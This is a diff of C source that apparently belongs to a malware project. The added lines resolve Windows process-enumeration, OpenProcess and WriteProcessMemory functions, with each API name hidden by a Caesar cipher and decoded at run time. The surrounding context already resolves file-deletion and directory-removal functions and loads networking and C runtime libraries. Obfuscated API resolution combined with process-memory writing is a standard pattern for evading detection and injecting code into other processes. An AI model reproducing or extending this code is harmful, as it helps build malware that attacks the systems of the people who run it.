@@ -33,6 +33,14 @@ void InitApis() {
 	Api.FindNextFileW = (TFindNextFileW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("KnsiSj}yKnqj\\"));
 	Api.RemoveDirectoryW = (TRemoveDirectoryW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("Wjrt{jInwjhytw~\\"));
 	Api.DeleteFileW = (TDeleteFileW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("IjqjyjKnqj\\"));
+	Api.lstrcpyW = (TlstrcpyW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("qxywhu~\\"));
+	Api.lstrcatW = (TlstrcatW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("qxywhfy\\"));
+	Api.CreateToolhelp32Snapshot = (TCreateToolhelp32Snapshot)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("HwjfyjYttqmjqu87Xsfuxmty"));
+	Api.Process32FirstW = (TProcess32FirstW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("Uwthjxx87Knwxy\\"));
+	Api.OpenProcess = (TOpenProcess)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("TujsUwthjxx"));
+	Api.Process32NextW = (TProcess32NextW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("Uwthjxx87Sj}y\\"));
+	Api.IsWow64Process = (TIsWow64Process)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("Nx\\t|;9Uwthjxx"));
+	Api.WriteProcessMemory = (TWriteProcessMemory)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("\\wnyjUwthjxxRjrtw~"));
 
 	hMsvcrt = LoadLibraryA(CAESAR_DECRYPT("rx{hwy3iqq"));
 	if (!hMsvcrt) {
@@ -58,6 +66,7 @@ void InitApis() {
 	Api.fclose = (Tfclose)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("khqtxj"));
 	Api.fread = (Tfread)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("kwjfi"));
 	Api.fwrite = (Tfwrite)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("k|wnyj"));
+	Api.wcscmp = (Twcscmp)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("|hxhru"));
 
 	hWininet = LoadLibraryA(CAESAR_DECRYPT("|x7d873iqq"));
 	if (!hWininet) {
